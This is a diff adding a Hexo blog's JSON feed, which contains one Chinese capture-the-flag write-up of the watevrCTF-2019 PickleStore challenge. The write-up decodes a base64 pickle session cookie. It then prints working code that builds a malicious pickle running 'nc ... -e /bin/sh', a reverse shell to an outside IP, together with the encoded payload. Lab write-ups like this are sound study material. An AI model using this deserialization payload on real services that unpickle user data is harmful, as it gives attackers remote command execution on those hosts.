@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"shell反弹\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/09/27/watevrCTF-2019-PickleStore/",
+            "url": "http://odiws.github.io/2024/09/27/watevrCTF-2019-PickleStore/",
+            "title": "[watevrCTF-2019]PickleStore",
+            "date_published": "2024-09-27T11:52:27.000Z",
+            "content_html": "<h2 id=\"watevrctf-2019picklestore\"><a class=\"markdownIt-Anchor\" href=\"#watevrctf-2019picklestore\">#</a> [watevrCTF-2019]PickleStore</h2>\n<p>题目名字的描述就是 pickle，感觉就是 pickle 反序列化，F12cookie 是</p>\n<pre><code>session=gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu\n</code></pre>\n<p>pickle：</p>\n<h3 id=\"pickledumps-obj\"><a class=\"markdownIt-Anchor\" href=\"#pickledumps-obj\">#</a> <strong>pickle.dumps( obj )</strong></h3>\n<blockquote>\n<p>序列化对象，并将结果数据流写入到文件对象中。参数 protocol 是序列化模式，默认值为 0，表示以文本的形式序列化。protocol 的值还可以是 1 或 2，表示以二进制的形式序列化。</p>\n</blockquote>\n<h3 id=\"pickleloads\"><a class=\"markdownIt-Anchor\" href=\"#pickleloads\">#</a> pickle.loads(）</h3>\n<blockquote>\n<p>反序列化对象。将数据解析为一个 Python 对象</p>\n</blockquote>\n<p>我们可以大概明确两点，这段信息是被序列化出来的，序列化后的信息被 base64 加密过再放到 cookie 里。</p>\n<p>我们可以试着反推一下我们最原始的 cookie 信息，理想的情况下他至少应该保存着我们有 500 块钱的信息。</p>\n<pre><code>import pickle\nfrom base64 import *\n\nenc = &quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;\n\nprint(pickle.loads(b64decode(enc)))\n#运行后回显:&#123;'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'&#125;\n</code></pre>\n<p>运行结果如下，果真显示了信息。</p>\n<p><img data-src=\"../images/1/1.png\" alt=\"1\"></p>\n<pre><code>&#123;'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'&#125;\n</code></pre>\n<p>这段 json 串 &quot;anti_tamper_hmac&quot; 字段明显的表明了，使用了加密手段。hmac 加密，了解的不是很深刻。</p>\n<p>本来想着要去爆破什么的，不过 md5 级别的爆破还是算了吧。</p>\n<p>然后东哥说，这个东西可以直接 getshell，也别去碰撞了。</p>\n<h2 id=\"getshell构造\"><a class=\"markdownIt-Anchor\" href=\"#getshell构造\">#</a> getshell 构造</h2>\n<p>由于要拿 shell，所以要先用小号去 basic 里启动一个靶机。</p>\n<p>我此时用的 ip 是随到的。</p>\n<h3 id=\"构造nc的序列化\"><a class=\"markdownIt-Anchor\" href=\"#构造nc的序列化\">#</a> 构造 nc 的序列化</h3>\n<pre><code>import base64\nimport pickle\n\n\nclass A(object):\n    def __reduce__(self):\n        return (eval, (&quot;__import__('os').system('nc 174.0.0.223 9999 -e/bin/sh')&quot;,))\na = A()\nprint( base64.b64encode( pickle.dumps(a) ) )\n#gANjYnVpbHRpbnMKZXZhbApxAFg4AAAAX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ25jIDE3NC4wLjAuMjIzIDk5OTkgLWUvYmluL3NoJylxAYVxAlJxAy4=\n</code></pre>\n<p><img data-src=\"../images/1/2.png\" alt=\"2\"></p>\n<p>拿到 flag</p>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vaDN6aDEvcC8xMjY5ODg5Ny5odG1s\">https://www.cnblogs.com/h3zh1/p/12698897.html</span></p>\n",
+            "tags": [
+                "buuctf",
+                "shell反弹"
+            ]
+        }
+    ]
+}
